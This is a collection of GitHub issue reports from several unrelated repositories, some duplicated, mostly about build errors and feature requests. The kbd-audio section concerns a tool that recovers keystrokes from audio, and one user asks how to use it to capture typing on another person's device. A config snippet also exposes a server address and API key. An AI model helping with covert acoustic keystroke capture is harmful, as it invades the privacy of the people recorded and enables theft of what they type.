 **Is your feature request related to a problem? Please describe.**
Yes, waste of space and disconnected embeds. Having each separate String for the embeds also sucks because it takes forever to make one embed.

**Describe the solution you'd like**
Make all embeds in the en-US.js file and then have the language.get methods just return them

**Describe alternatives you've considered**
Current solution

**Additional context**
![image](https://user-images.githubusercontent.com/46133336/57200496-cd15ab80-6f5a-11e9-9771-25dcbd5a9d78.png)
![image](https://user-images.githubusercontent.com/46133336/57200499-d4d55000-6f5a-11e9-800d-4ed2a4a6db8d.png)

 Allow the option when searching/requesting songs to show a list of the top 5 results.
<---------->
144975898
There is [auto-parse](https://github.com/greenpioneersolutions/auto-parse) package, that detects typed value from string attribute and parses that correspondingly.
Taking into account component's `propTypes` it would be handy to have automatic attributes parser to corresponding type.
Does that make sense @rstacruz? Instead of creating a `span` and mounting the React component in there, we could also just mount directly into the `shadowRoot`.  According to this [comment](https://github.com/spring-media/react-shadow-dom-retarget-events/pull/12#issue-253607855) the event system of the latest version of React supports `shadowRoot` now, no retargeting needed. Retargeting is only required when mounting in a child of `shadowRoot`, so why not avoid the problem altogether by not using a child at all? do you plan to add support for events such that when using shadow dom, events set on react components would still work?

there is also this package: https://www.npmjs.com/package/react-shadow-dom-retarget-events but it would be nice to have it integrated in remount There is [auto-parse](https://github.com/greenpioneersolutions/auto-parse) package, that detects typed value from string attribute and parses that correspondingly.
Taking into account component's `propTypes` it would be handy to have automatic attributes parser to corresponding type.
Does that make sense @rstacruz?  Perhaps point users towards https://github.com/yahoo/serialize-javascript just to be careful? do you plan to add support for events such that when using shadow dom, events set on react components would still work?

there is also this package: https://www.npmjs.com/package/react-shadow-dom-retarget-events but it would be nice to have it integrated in remount Do you plan to support preact, which is better suited for web components because of its weight? The bright idea of remount doesn't let me go.

There's a use-case for custom elements, that allows extending built-in components https://developer.mozilla.org/en-US/docs/Web/Web_Components/Using_custom_elements#Customized_built-in_elements. That allows to solve inherent problems of JSX, as stated in the preact issue https://github.com/developit/htm/issues/81

If remount would take `extends: tagName` as an option, it would enable component-less JSX:
```js
htm`
<nav is="app-nav"/>
<main is="app-page">
  <header slot="header" />
  <section slot="content">...</section>
  <footer slot="footer" />
</main>
`
```
<---------->
145133007
If a post in Ghost has codeinjection_foot set but not codeinjection_head, then gatsby-source-ghost throws an error:

TypeError: Cannot read property 'concat' of undefined

### Technical details:

* Ghost Version: >2.10.0
* Gatsby Source Ghost Version: >3.4.0
 I get the following error after simply adding the plugin to my 'gastby-config.js' file:

```javascript
{
      resolve: 'gatsby-source-ghost',
      options: {
        apiUrl: 'http://165.22.123.203/ghost',
        contentApiKey: 'af42a8bea1d7a6e1ef1a611193',
        version: 'v2',
      },
    },
```

Error output:
```
 ERROR #11321  PLUGIN

"gatsby-source-ghost" threw an error while running the sourceNodes lifecycle:

Cannot read property 'codeinjection_head' of undefined

  TypeError: Cannot read property 'codeinjection_head' of undefined
  
  - gatsby-node.js:99 
    [landing-page]/[gatsby-source-ghost]/gatsby-node.js:99:43
  
  - task_queues.js:89 processTicksAndRejections
    internal/process/task_queues.js:89:5
  
  - From previous event:
  
  - gatsby-node.js:120 createLiveGhostNodes
    [landing-page]/[gatsby-source-ghost]/gatsby-node.js:120:20
  
  - gatsby-node.js:155 Object.exports.sourceNodes
    [landing-page]/[gatsby-source-ghost]/gatsby-node.js:155:12
  
  - api-runner-node.js:234 runAPI
    [landing-page]/[gatsby]/dist/utils/api-runner-node.js:234:37
  
  - api-runner-node.js:347 Promise.catch.decorateEvent.pluginName
    [landing-page]/[gatsby]/dist/utils/api-runner-node.js:347:15
  
  - api-runner-node.js:346 
    [landing-page]/[gatsby]/dist/utils/api-runner-node.js:346:12
  
  - timers.js:439 processImmediate
    internal/timers.js:439:21
```

Versions:
Ghost Version:  2.31.1
Gatsby CLI version: 2.7.14
Gatsby version: 2.15.28
Gatsby Source Ghost Version: 4.01
Node Version: v12.3.1
OS: OSX Mojave
 I get the following error after simply adding the plugin to my 'gastby-config.js' file:
```

```
{
      resolve: 'gatsby-source-ghost',
      options: {
        apiUrl: 'http://165.22.123.203/ghost',
        contentApiKey: 'af42a8bea1d7a6e1ef1a611193',
        version: 'v2',
      },
    },
```
Error output:

 ERROR #11321  PLUGIN

"gatsby-source-ghost" threw an error while running the sourceNodes lifecycle:

Cannot read property 'codeinjection_head' of undefined

  TypeError: Cannot read property 'codeinjection_head' of undefined
  
  - gatsby-node.js:99 
    [landing-page]/[gatsby-source-ghost]/gatsby-node.js:99:43
  
  - task_queues.js:89 processTicksAndRejections
    internal/process/task_queues.js:89:5
  
  - From previous event:
  
  - gatsby-node.js:120 createLiveGhostNodes
    [landing-page]/[gatsby-source-ghost]/gatsby-node.js:120:20
  
  - gatsby-node.js:155 Object.exports.sourceNodes
    [landing-page]/[gatsby-source-ghost]/gatsby-node.js:155:12
  
  - api-runner-node.js:234 runAPI
    [landing-page]/[gatsby]/dist/utils/api-runner-node.js:234:37
  
  - api-runner-node.js:347 Promise.catch.decorateEvent.pluginName
    [landing-page]/[gatsby]/dist/utils/api-runner-node.js:347:15
  
  - api-runner-node.js:346 
    [landing-page]/[gatsby]/dist/utils/api-runner-node.js:346:12
  
  - timers.js:439 processImmediate
    internal/timers.js:439:21
```

Versions:
Ghost Version:  2.31.1
Gatsby CLI version: 2.7.14
Gatsby version: 2.15.28
Gatsby Source Ghost Version: 4.01
Node Version: v12.3.1
OS: OSX Mojave
 If a post in Ghost has codeinjection_foot set but not codeinjection_head, then gatsby-source-ghost throws an error:

TypeError: Cannot read property 'concat' of undefined

### Technical details:

* Ghost Version: >2.10.0
* Gatsby Source Ghost Version: >3.4.0
 Not sure if my bad code or a bug, but it doesn't seem to be building production builds (via Netlify). Throws the error
`TypeError: expecting an array or an iterable object but got [object Null] `

Well on development it also gives that error but still builds everything fine from the my Ghost api.

Here's the full code

```
const path = require("path")
const _ = require(`lodash`)

exports.createPages = ({ graphql, actions }) => {
  const { createPage } = actions
  const createPosts = new Promise((resolve, reject) => {
    const postTemplate = path.resolve(`./src/templates/blogTemplate.js`)
    resolve(
      graphql(`
        {
 allGhostPost(sort: { order: DESC, fields: [published_at] }) {
    edges {
      node {
        id
        slug
        title
        html
        published_at
      }
    }
 }
        }
      `).then(result => {
        const items = result.data.allGhostPost.edges

        _.forEach(items, ({ node }) => {
          node.url = `/${node.slug}/`
          createPage({
            path: node.url,
            component: path.resolve(postTemplate),
            context: {
              slug: node.slug,
            },
          })
        })

        return resolve()
      }).catch(error => {
        console.log(error);
      })
    )
  })

  return Promise.all(createPosts)
}

```

Ran a graphql query as well and results seems fine. 

<img width="862" alt="Screenshot 2019-03-20 at 16 31 26" src="https://user-images.githubusercontent.com/19263291/54667933-fad09d80-4b30-11e9-9249-6b34996cdef5.png">
 Hi,

Each time I tried to query data post/pages through graphiql the mobiledoc field is set to null.
If I call the content api directly with a raw curl query it works fine, I've got data on mobiledoc format.

I installed the gatsby-source-ghost plugin localy and tried adding mobiledoc on postAndPageFetchOptions object's formats field. Located in gatsby-node.js, but this does not work.

`    const postAndPageFetchOptions = {
        limit: 'all',
        include: 'tags,authors',
        formats: 'mobiledoc,html,plaintext'
    };
`

Is there something I've missed ?

To go further, I thought it would be nice to have mobile doc format to add imageSharp processing support via a transformer plugin. There is a html-to-mobiledoc helper on the ghost SDK, but I don't think it's the right way to do it while at some point I should be able to query this format "natively".

![ghostnodegraphql](https://user-images.githubusercontent.com/38563184/51619815-63383f80-1f31-11e9-8195-92e0b4d097ed.PNG)

Hope someone can clarify.
Have a nice day


 Opening this as a catch-all as I assume this will get reported often. 

The gatsby-source-ghost plugin suffers from Gatsby bug: https://github.com/gatsbyjs/gatsby/issues/3344 /

Which is covered by this refactor epic: https://github.com/gatsbyjs/gatsby/issues/4261

This issue means that if the first post/tag/author returned from the API has nulls for optional fields such as custom_excerpt, feature_image, profile_image, og & twitter fields, Gatsby sets these to null permanently.

Any subsequent posts/tags/authors that have the fields set will have those fields ignored. 

The current workaround is to ensure your oldest post has all fields populated. There are other options for workarounds that _might_ possibly be added to this plugin - we'll look into those.
 ## Summary

Right now -- this plugin has several areas that could be augmented to better support the Gatsby ecosystem, particularly with Gatsby Cloud. Specifically:

1. Images are sourced from `static.ghost.org` rather than tying into `createRemoteFileNode` functionality (See #5)
1. No ability to "live update" data from Ghost, e.g. when content is created, updated or deleteed

Let's focus on #2 for this issue.

## Live Updating

Gatsby Cloud uses webhooks to synchronize content from the CMS with the running Gatsby application. Ghost _already_ supports webhooks, so we're part of the way there towards supporting hot reloading of data.

How it works under the hood is that the `sourceNodes` function in `gatsby-node.js` is re-invoked whenever we receive a web hook. What's missing now is some way to incrementally know what has been changed, and how to take the _current_ state of the GraphQL schema and update it to match the new Ghost data.

To best support plugin authors, we've put together an [Integration Guide](https://gatsbyjs.com/docs/integration-guide/) that outlines several approaches in updating a plugin to have great Gatsby Cloud support. The eventual result of this work would be:

1. This plugin has a way to request _changed_ data
1. This plugin (when sourceNodes is invoked) calls `createNode`, `deleteNode`, and `touchNode` to get the schema consistent with Ghost

@JohnONolan question -- does the webhook that's triggered receive a payload? That could be a relatively low-effort way to get the updated content!

## Adding Gatsby Cloud as an Integration

For anyone else who may be working on this, adding Gatsby Cloud will look something like this:

![Screen Shot 2019-06-20 at 5 07 50 PM](https://user-images.githubusercontent.com/3924690/59884615-7fc09280-937e-11e9-92df-aa9e8f185790.png)
 Hi,

Each time I tried to query data post/pages through graphiql the mobiledoc field is set to null.
If I call the content api directly with a raw curl query it works fine, I've got data on mobiledoc format.

I installed the gatsby-source-ghost plugin localy and tried adding mobiledoc on postAndPageFetchOptions object's formats field. Located in gatsby-node.js, but this does not work.

`    const postAndPageFetchOptions = {
        limit: 'all',
        include: 'tags,authors',
        formats: 'mobiledoc,html,plaintext'
    };
`

Is there something I've missed ?

To go further, I thought it would be nice to have mobile doc format to add imageSharp processing support via a transformer plugin. There is a html-to-mobiledoc helper on the ghost SDK, but I don't think it's the right way to do it while at some point I should be able to query this format "natively".

![ghostnodegraphql](https://user-images.githubusercontent.com/38563184/51619815-63383f80-1f31-11e9-8195-92e0b4d097ed.PNG)

Hope someone can clarify.
Have a nice day


 Not sure if my bad code or a bug, but it doesn't seem to be building production builds. Throws the error
`TypeError: expecting an array or an iterable object but got [object Null] `

Well on development it gives that error but still builds fine from the my Ghost api.

Here's the full code

```
const path = require("path")
const _ = require(`lodash`)

exports.createPages = ({ graphql, actions }) => {
  const { createPage } = actions
  const createPosts = new Promise((resolve, reject) => {
    const postTemplate = path.resolve(`./src/templates/blogTemplate.js`)
    resolve(
      graphql(`
        {
 allGhostPost(sort: { order: DESC, fields: [published_at] }) {
    edges {
      node {
        id
        slug
        title
        html
        published_at
      }
    }
 }
        }
      `).then(result => {
        const items = result.data.allGhostPost.edges

        _.forEach(items, ({ node }) => {
          node.url = `/${node.slug}/`
          createPage({
            path: node.url,
            component: path.resolve(postTemplate),
            context: {
              slug: node.slug,
            },
          })
        })

        return resolve()
      }).catch(error => {
        console.log(error);
      })
    )
  })

  return Promise.all(createPosts)
}

```


<---------->
145758377
Hello, I am having an issue on the Android side this time with building an apk file. I am using v1.0.1. When I try to build an apk file I am receiving a build failure error stating "Failed to execute aapt See the Console for details.

It seems there is an issue with a fontstyle, font, and fontweight not being found? I am placing the console output in a txt file. Please see attached txt file for the console output:

[Pilgrim Android Build Failure - Console Output - 02-20-2019.txt](https://github.com/foursquare/pilgrim-unity-sdk/files/2886966/Pilgrim.Android.Build.Failure.-.Console.Output.-.02-20-2019.txt)

Please help me get this building. Thank you in advance for your time and help!
. Hello, I am having an issue on the Android side this time with building an apk file. I am using v1.0.1. When I try to build an apk file I am receiving a build failure error stating "Failed to execute aapt See the Console for details.

It seems there is an issue with a fontstyle, font, and fontweight not being found? I am placing the console output in a txt file. Please see attached txt file for the console output:

[Pilgrim Android Build Failure - Console Output - 02-20-2019.txt](https://github.com/foursquare/pilgrim-unity-sdk/files/2886966/Pilgrim.Android.Build.Failure.-.Console.Output.-.02-20-2019.txt)

Please help me get this building. Thank you in advance for your time and help!
. Hi Foursquare team!

We are receiving an error when attempting to distribute our app in xcode. The build is succeeding, however when you select to distribute the app we are receiving an error that states:

Failed to verify bitcode in Pilgrim.framework/Pilgrim:
error: Cannot extract bundle from /var/folders/r8/2_5xnmrd2_z1v0vz2194qbr0000gp/T/
IDEDistributionOptionThinning.~~~7FbtzZ/Payload/AirEverywherePOC.app/Frameworks/Pilgrim.framework/Pilgrim (i386)
![image](https://user-images.githubusercontent.com/47788677/53030707-39831300-3420-11e9-91cf-f97decd21e24.png)

Also if we turn off app thinning we can get one step further than this error, but then receive this error:

Code signing "Pilgrim.framework" failed.
![image from ios](https://user-images.githubusercontent.com/47788677/53030734-46a00200-3420-11e9-9070-76c477709c16.jpg)

which doesn't say anything more than that and says to view the distribution logs for more information.

We can disable bitcode to get this to go through successfully, however this would also mean that it won't be optimally recompiled at the bit code level.

Can you please help us to figure out this issue?
 Hi Foursquare team!

We are receiving an error when attempting to distribute our app in xcode. The build is succeeding, however when you select to distribute the app we are receiving an error that states:

Failed to verify bitcode in Pilgrim.framework/Pilgrim:
error: Cannot extract bundle from /var/folders/r8/2_5xnmrd2_z1v0vz2194qbr0000gp/T/
IDEDistributionOptionThinning.~~~7FbtzZ/Payload/AirEverywherePOC.app/Frameworks/Pilgrim.framework/Pilgrim (i386)
![image](https://user-images.githubusercontent.com/47788677/53030707-39831300-3420-11e9-91cf-f97decd21e24.png)

Also if we turn off app thinning we can get one step further than this error, but then receive this error:

Code signing "Pilgrim.framework" failed.
![image from ios](https://user-images.githubusercontent.com/47788677/53030734-46a00200-3420-11e9-9070-76c477709c16.jpg)

which doesn't say anything more than that and says to view the distribution logs for more information.

We can disable bitcode to get this to go through successfully, however this would also mean that it won't be optimally recompiled at the bit code level.

Can you please help us to figure out this issue?
 Hi Pilgrim team,

I have run into an issue building for xcode and it looks like it could be related to the Pilgrim SDK. In xcode the build is failing and I am getting an error that Command PhaseScriptExecution failed with a nonzero exit code. Here is the full error code from xcode:

/Users/geoffgoeres-hill/Library/Developer/Xcode/DerivedData/Unity-iPhone-adhkmrncivefnlanoajzziszytus/Build/Products/ReleaseForRunning-iphoneos/AirEverywhereMVP.app/Frameworks/Pilgrim.framework/strip-frameworks.sh: line 18:
: command not found
/Users/geoffgoeres-hill/Library/Developer/Xcode/DerivedData/Unity-iPhone-adhkmrncivefnlanoajzziszytus/Build/Products/ReleaseForRunning-iphoneos/AirEverywhereMVP.app/Frameworks/Pilgrim.framework/strip-frameworks.sh: line 28:
: command not found
/Users/geoffgoeres-hill/Library/Developer/Xcode/DerivedData/Unity-iPhone-adhkmrncivefnlanoajzziszytus/Build/Products/ReleaseForRunning-iphoneos/AirEverywhereMVP.app/Frameworks/Pilgrim.framework/strip-frameworks.sh: line 29:
: command not found
/Users/geoffgoeres-hill/Library/Developer/Xcode/DerivedData/Unity-iPhone-adhkmrncivefnlanoajzziszytus/Build/Products/ReleaseForRunning-iphoneos/AirEverywhereMVP.app/Frameworks/Pilgrim.framework/strip-frameworks.sh: line 31: syntax error near unexpected token `{
'
/Users/geoffgoeres-hill/Library/Developer/Xcode/DerivedData/Unity-iPhone-adhkmrncivefnlanoajzziszytus/Build/Products/ReleaseForRunning-iphoneos/AirEverywhereMVP.app/Frameworks/Pilgrim.framework/strip-frameworks.sh: line 31: `code_sign() {
'
Command PhaseScriptExecution failed with a nonzero exit code


Can you please help me figure out how to resolve this so I can build to a device?

<img width="858" alt="Screen Shot 2019-06-05 at 1 36 26 PM" src="https://user-images.githubusercontent.com/47788677/58997220-6f21f100-87b0-11e9-9e6f-d72d068f352d.png">

<---------->
145805866
![image](https://user-images.githubusercontent.com/36189354/61171751-91c4d800-a5ae-11e9-90ea-10b4b31d6b96.png)
![image](https://user-images.githubusercontent.com/36189354/61171757-a43f1180-a5ae-11e9-8bd7-2e3e5ebb4491.png)
 1.代码中指定路径的图片不生效，而使用外链就可以
2.图片粘贴事件是有正常输出文件，但是页面没显示，是不是本来就是这样的
![image](https://user-images.githubusercontent.com/18522653/59986599-15536f00-966a-11e9-9923-a9a81e0a1f53.png)
 ```
addImageClickLintener() {}
// 应该是
addImageClickListener() {}
```   只想展示使用,不想编辑,能否将preview的属性暴露出来,通过配置来选择，做展示器还是做编辑器。看作者的文档,其实实现并不难，是否可以呢? 我想要像你的说明文件那样黑白的那种代码块，但是貌似设置:theme="OneDark"也不生效，请问是如何设置的呢？ ![image](https://user-images.githubusercontent.com/22864444/64004208-60916e80-cb40-11e9-9399-9c2ff9fdffe5.png)

![image](https://user-images.githubusercontent.com/22864444/64004320-9e8e9280-cb40-11e9-8555-b9868acc769c.png)

获取markdown的引用为undefined。请问该如何获取？ 目前的 markdown 编辑器大多是左右两个窗口，左边输入内容，右边实时预览。

不知道你是否使用过 `Typora`(pc端程序)，或者网页端的 `语雀`，它们支持在一个窗口内编写 markdown 内容，实时预览。

关于这种单窗口 markdown 编辑器的实现，你可有啥思路？我纠结了很久一丢丢思路也没........ # 问题

目前 markdown 里的图片只能用网络地址，不能用本地路径引用图片。在 marked issues 里发现有 baseUrl 属性，可以给 img 路径添加前缀，可以解决这个问题。

```
marked.setOptions({
  baseUrl: 'http://example.com/',
});
```

markdown 写法

```
![](static/cat.svg)
```

目前输出

```
<p><img src="/static/cat.svg" alt=""></p>
```

期待输出

```
<p><img src="http://example.com/static/cat.svg" alt=""></p>
```

# 建议

vue 组件暴露属性 `markedOptions`，用户可以自定义 marked 语法。 initialValue  height这些都不起作用。。。 能否支持 toc 在工具栏，没有手动保存按钮触发事件 # 问题

目前 markdown 里的图片只能用网络地址，不能用本地路径引用图片。在 marked issues 里发现有 baseUrl 属性，可以给 img 路径添加前缀，可以解决这个问题。

```
marked.setOptions({
  baseUrl: 'http://example.com/',
});
```

markdown 写法

```
![](static/cat.svg)
```

目前输出

```
<p><img src="/static/cat.svg" alt=""></p>
```

期待输出

```
<p><img src="http://example.com/static/cat.svg" alt=""></p>
``` ```
addImageClickLintener() {}
// 应该是
addImageClickListener() {}
```  initialValue  height这些都不起作用。。。 回车在预览区不会换行呀 能否支持 toc - 谢谢的奉献！加油！

- 列表中有加粗的字体时 ，样式有问题

![image](https://user-images.githubusercontent.com/18030804/68459901-896d6880-0241-11ea-9a17-16bba9769b04.png)
 如何在保存的时候直接获取到解析后的html? 编辑区域默认的颜色为黑色，在一些场景中，黑色和系统的整体不是很搭配，建议增加可配置的功能
<---------->
146330145
Hi , Amazing idea.

i'm running A Kali-Linux and setup process was alright.
but , getting " Failed to initialize OpenGL loader!  " while trying to :

Usage: ./view-gui record.kbd

Found 1 playback devices:
    - Playback device #0: 'ES1371/ES1373 / Creative Labs CT2518 (Audio PCI 64V/128/5200 / Creative CT4810/CT5803/CT5806 [Sound Blaster PCI]) Analog Stereo'
Opened playback device succesfully!
    Frequency:  24000
    Format:     32784
    Channels:   1
    Samples:    1024
[+] Loading recording from 'output.kbd'
Failed to initialize OpenGL loader!     
------

$  glxinfo | grep rendering
direct **rendering**: Yes

----

Not sure what is that i'm missed .
 Hi , Amazing idea.

i'm running A Kali-Linux and setup process was alright.
but , getting " Failed to initialize OpenGL loader!  " while trying to :

Usage: ./view-gui record.kbd

 Found 1 playback devices:
    - Playback device #0: 'ES1371/ES1373 / Creative Labs CT2518 (Audio PCI 64V/128/5200 / Creative CT4810/CT5803/CT5806 [Sound Blaster PCI]) Analog Stereo'
Opened playback device succesfully!
    Frequency:  24000
    Format:     32784
    Channels:   1
    Samples:    1024
[+] Loading recording from 'output.kbd'
Failed to initialize OpenGL loader!     
------
$ glxinfo | grep "OpenGL version"
OpenGL version string: 2.1 Mesa 19.1.2



$  glxinfo | grep rendering
direct **rendering**: Yes



----

Not sure what is that i'm missed .
 $ make
[  2%] Building CXX object CMakeFiles/Core.dir/audio_logger.cpp.o
[  4%] Linking CXX static library libCore.a
[  4%] Built target Core
[  7%] Building CXX object CMakeFiles/ImGui.dir/imgui/imgui.cpp.o
[  9%] Building CXX object CMakeFiles/ImGui.dir/imgui/imgui_draw.cpp.o
[ 11%] Building CXX object CMakeFiles/ImGui.dir/imgui/imgui_demo.cpp.o
[ 14%] Building CXX object CMakeFiles/ImGui.dir/imgui/imgui_widgets.cpp.o
[ 16%] Building C object CMakeFiles/ImGui.dir/imgui/examples/libs/gl3w/GL/gl3w.c.o
[ 19%] Building CXX object CMakeFiles/ImGui.dir/imgui/examples/imgui_impl_sdl.cpp.o
[ 21%] Building CXX object CMakeFiles/ImGui.dir/imgui/examples/imgui_impl_opengl3.cpp.o
[ 23%] Linking CXX static library libImGui.a
[ 23%] Built target ImGui
[ 26%] Building CXX object CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o
/home/fwt/kbd-audio/view-full-gui.cpp: In function ‘bool generateLowResWaveform(const TWaveformView&, TWaveform&, int)’:
/home/fwt/kbd-audio/view-full-gui.cpp:116:10: error: expected unqualified-id before ‘[’ token
     auto [samples, n] = waveform;
          ^
/home/fwt/kbd-audio/view-full-gui.cpp:118:27: error: ‘n’ was not declared in this scope
     TWaveform waveformAbs(n);
                           ^
/home/fwt/kbd-audio/view-full-gui.cpp:120:35: error: ‘samples’ was not declared in this scope
         waveformAbs[i] = std::abs(samples[i]);
                                   ^
CMakeFiles/view-full-gui.dir/build.make:62: recipe for target 'CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o' failed
make[2]: *** [CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o] Error 1
CMakeFiles/Makefile2:73: recipe for target 'CMakeFiles/view-full-gui.dir/all' failed
make[1]: *** [CMakeFiles/view-full-gui.dir/all] Error 2
Makefile:83: recipe for target 'all' failed
make: *** [all] Error 2

it seems like that this occurs because the compiler can not understand the keyword "auto". However I have upgrade my cmake to 3.13 and CMakeLists.txt : set (CMAKE_CXX_STANDARD 17) is working now.
How to solve this? Should I upgrade my g++ or gcc? Does it need to collect many kinds of keybords, such as a keybord used 3 years.
Different keybord may make different sound so as the keybord used very long time. Hey man love the work you done with this. I was wondering can it be used with a microphone plugged into the laptop as opposed to the built in microphone in the laptop? what type of microphone did you use and how did you train the software to recall at a successful rate.  please, I have a question, the first one is, the kbd tool it's a captures the characters from the keyboard using audio right? 
?? or its just capture the captures the characters using some of the keylogger technique and convert the text to audio???. 


the second one is if the first question true I mean if the tool can capture the characters from the keyboard using audio how can I use this tool to capture  from another device I mean how can i install it in devices 1 and capture  from devise 2  Hello!
I am trying to run keytap on Linux system like that:
`sudo ./keytap /dev/input/event13`
But every time I got the error:

> Buffer size in file (1565157006) does not match the expected one (5)

The first number is always changing, for example:

> Buffer size in file (1565157170) does not match the expected one (5)

Please, would you like to provide some information how to select input device (input.kbd)? Because in my Linux installation I have 24 /dev/input/event* devices...

Thank you in advanced. Hey man love the work you done with this. I was wondering can it be used with a microphone plugged into the laptop as opposed to the built in microphone in the laptop? what type of microphone did you use and how did you train the software to recall at a successful rate.  Keytap2 allows recovering audio to text from just the audio recording. Allowing importing of recordings made elsewhere would allows recordings made with other equipment (phones, etc.) and then use the tool to record the text.  ```

[pjb@L0253344 :0 build]$ ./record record.kbd
Recording 5 frames per key press
Found 1 capture devices:
    - Capture device #0: 'Built-in Audio Analog Stereo'
Opened capture device 2
    Frequency:  24000
    Format:     33056 (4 bytes)
    Channels:   1
    Samples:    512

Last recorded key -  10 '[enter]'. Total times recorded so far -   1. Total data saved: 0.00976562 MB
  C-c C-c
[pjb@L0253344 :0 build]$ ./keytap2 record.kbd 
Usage: ./keytap2 record.kbd
[+] Loading recording from 'record.kbd'
[+] Loaded recording: of 2562 samples (sample size = 4 bytes)
    Size in memory:          0.00977325 MB
    Sample size:             4
    Total number of samples: 2562
    Recording length:        0.10675 seconds
[+] Searching for key presses
[+] Detected a total of 0 potential key presses
[+] Search took 0.000 seconds
[+] Calculating CC similarity map
[+] Calculation took 0.000 seconds
   -1 
--------------------------------------------------------------------------------------------------------------------------------------

[+] Top 10 pairs
Segmentation fault (core dumped)
[pjb@L0253344 :0 build]$ 
```

```
[pjb@L0253344 :0 build]$ coredumpctl dump    25539 > keytap2.core
           PID: 25539 (keytap2)
           UID: 1000 (pjb)
           GID: 1000 (pjb)
        Signal: 11 (SEGV)
     Timestamp: Fri 2018-11-30 14:25:40 CET (2min 43s ago)
  Command Line: ./keytap2 record.kbd
    Executable: /home/pjb/src/kbd-audio/build/keytap2
 Control Group: /user.slice/user-1000.slice/session-2.scope
          Unit: session-2.scope
         Slice: user-1000.slice
       Session: 2
     Owner UID: 1000 (pjb)
       Boot ID: 01b5433ca7d64ffebbb9631c12690f2c
    Machine ID: 3c990c4b0b06406caa7241e23025e717
      Hostname: L0253344
       Storage: /var/lib/systemd/coredump/core.keytap2.1000.01b5433ca7d64ffebbb9631c12690f2c.25539.1543584340000000.lz4
       Message: Process 25539 (keytap2) of user 1000 dumped core.
                
                Stack trace of thread 25539:
                #0  0x000055665c312020 n/a (/home/pjb/src/kbd-audio/build/keytap2)
```
[keytap2.core.xz.base64.txt](https://github.com/ggerganov/kbd-audio/files/2633344/keytap2.core.xz.base64.txt)
   I change the SDL the #include <SDL.h> to  #include <SDL2/SDL.h> and seems compile but i got a problem in the linker

Scanning dependencies of target view-full-gui
[ 35%] Building CXX object CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o
[ 38%] Linking CXX executable view-full-gui
/usr/bin/ld: CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o: en la función `prepareAudioOut(stParameters const&)':
view-full-gui.cpp:(.text+0x2b3): referencia a `SDL_Init' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x2c2): referencia a `SDL_GetNumAudioDevices' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x2ed): referencia a `SDL_GetAudioDeviceName' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x31a): referencia a `SDL_memset' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x361): referencia a `SDL_memset' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x373): referencia a `SDL_OpenAudioDevice' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x3e8): referencia a `SDL_PauseAudioDevice' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x411): referencia a `SDL_GetError' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x424): referencia a `SDL_LogError' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x429): referencia a `SDL_Quit' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x439): referencia a `SDL_GetError' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x44c): referencia a `SDL_LogError' sin definir
/usr/bin/ld: CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o: en la función `renderWaveform(stParameters&, std::vector<int, std::allocator<int> > const&)':
view-full-gui.cpp:(.text+0x150f): referencia a `SDL_PauseAudioDevice' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x1538): referencia a `SDL_ClearQueuedAudio' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x1548): referencia a `SDL_PauseAudioDevice' sin definir
/usr/bin/ld: CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o: en la función `std::_Function_handler<bool (), main::{lambda()#2}>::_M_invoke(std::_Any_data const&)':
view-full-gui.cpp:(.text+0x1ac4): referencia a `SDL_PollEvent' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x1b02): referencia a `SDL_PollEvent' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x1b2d): referencia a `SDL_GetWindowSize' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x21c1): referencia a `SDL_PauseAudioDevice' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x22b2): referencia a `SDL_GL_MakeCurrent' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x2312): referencia a `SDL_GL_SwapWindow' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x2468): referencia a `SDL_GetWindowID' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x24cf): referencia a `SDL_ClearQueuedAudio' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x24df): referencia a `SDL_PauseAudioDevice' sin definir
/usr/bin/ld: CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o: en la función `main':
view-full-gui.cpp:(.text.startup+0x7d): referencia a `SDL_Init' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x1c4): referencia a `SDL_GL_SetAttribute' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x1d3): referencia a `SDL_GL_SetAttribute' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x1e2): referencia a `SDL_GL_SetAttribute' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x1ee): referencia a `SDL_GL_SetAttribute' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x1fd): referencia a `SDL_GL_SetAttribute' sin definir
/usr/bin/ld: CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o:view-full-gui.cpp:(.text.startup+0x20c): más referencias a `SDL_GL_SetAttribute' sin definir a continuación
/usr/bin/ld: CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o: en la función `main':
view-full-gui.cpp:(.text.startup+0x227): referencia a `SDL_GetCurrentDisplayMode' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x250): referencia a `SDL_CreateWindow' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x25d): referencia a `SDL_GL_CreateContext' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x26c): referencia a `SDL_GL_SetSwapInterval' sin definir
